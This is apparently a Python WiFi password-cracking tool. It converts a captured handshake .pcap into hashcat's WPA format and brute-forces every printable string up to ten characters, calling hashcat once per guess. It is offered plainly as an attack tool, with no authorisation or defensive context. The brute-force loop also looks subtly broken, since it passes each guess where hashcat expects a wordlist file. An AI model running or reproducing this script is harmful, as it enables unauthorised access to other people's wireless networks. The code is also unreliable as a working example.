import os
import subprocess
import string
import itertools
import signal

# ASCII Art
ascii_art = """
   ██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
   ██║    ██║██║██╔════╝██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██║ █╗ ██║██║█████╗  ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
   ██║███╗██║██║██╔══╝  ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
   ╚███╔███╔╝██║██║     ██║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

print(ascii_art)
print("          WiFi-Grabber Tool • © 2023 • 47lecoste • https://github.com/grugnoymeme")
print("")
print("")
print("  _____________________________________________________________________________________________\n")
print("* If files you select aren't in the same directory of the script, please write their entire path.")
print("")
print("** Type ^C (CTRL + c) to stop the script, if you want to exit before the end of the operation.")
print("  _____________________________________________________________________________________________\n")
print("")
print("")

# Select input .pcap file
input_file = ""
while True:
    input_file = input("Insert input .pcap file's NAME or PATH: ")
    if input_file.endswith((".pcap", ".cap", ".pcapng")) and os.path.isfile(input_file):
        break
    else:
        print("Invalid input file. Please make sure the file exists and has a valid format.")

# Convert the .pcap file into .hc22000
hc22000_file = "wpa_crack.hc22000"
subprocess.run(["hcxpcapngtool", "-o", hc22000_file, input_file])

print("  _____________________________________________________________________________________________\n")
print("  ---------------------------------------------------------------------------------------------\n")

# Brute force attack
charset = string.printable  # Define the character set to be used
password_length = 10  # Define the length of the password to be brute forced

# Function to manage the timeout
def timeout_handler(signum, frame):
    raise TimeoutError("Timeout expired. Password not found.")

# set the timeout to 600" = 10' (10 minutes)
timeout = 600

# SEt the manager of signals for SIGALRM (the allarm)
signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(timeout)

# Brute force attack
try:
    for i in range(password_length):
        for password in itertools.product(charset, repeat=i+1):
            password = ''.join(password)
            # Run hashcat with the brute-forced password
            result = subprocess.run(["hashcat", "-m", "22000", hc22000_file, password], capture_output=True)
            if "Cracked" in result.stdout.decode():
                print(f"Password found: {password}")
                raise SystemExit(0)  # Terminate the script if the password is found
except TimeoutError as e:
    print(str(e))
finally:
    # Cance the alarm of the timeout
    signal.alarm(0)
